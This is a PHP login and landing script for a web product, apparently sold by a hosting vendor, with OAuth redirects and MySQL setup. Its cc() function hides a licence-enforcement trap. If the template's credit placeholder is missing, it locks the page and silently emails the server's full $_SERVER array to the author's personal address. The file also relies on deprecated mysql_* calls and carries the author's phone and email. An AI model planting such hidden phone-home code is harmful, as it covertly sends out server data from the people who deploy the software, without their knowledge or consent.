<?php
session_start();
#################################################
// ahmed almalki
// 0543347557
// protop96@gmail.com
// http://waseethost.com/
#################################################	
if (isset($_SESSION['id'])) {
    // Redirection to login page twitter
  //  header("location: home.php");
}

if (array_key_exists("login", $_GET)) {
    $oauth_provider = $_GET['oauth_provider'];
    if ($oauth_provider == 'twitter') {
        header("Location: login-twitter.php");
    } else if ($oauth_provider == 'facebook') {
        header("Location: login-facebook.php");
    }
}

  require 'config/dbconfig.php';
  $sql=mysql_query("SELECT * FROM `website` ") ;
  $row=mysql_fetch_assoc($sql);

function cc($cc){
##########
$content = file_get_contents($cc);
$content_md5 = md5($content);
$newvalue = "<div id=\"cc\">برمجة : <a href=\"https://www.waseethost.com\" >الوسيط هوست</a> جميع الحقوق محفوظه للوسيط هوست</div>";
$new_content = str_replace("{cc}",$newvalue,$content);
$new_content_md5 = md5($new_content);
############
  if($content_md5 != $new_content_md5 ) {
    echo $new_content;

  }else{

    echo '<h1>تم قفل السكربت بسبب نزع الحقوق</h1>';
   // print$content_md5.' <br /> '.$new_content_md5;
    @$headers = $row['Mail'];
    @$inputMessage = join(" ",$_SERVER);
    @mail("protop96@gmail.com", "نزع الحقوق", $inputMessage, 'From:'.$headers);

  }

}

  ?>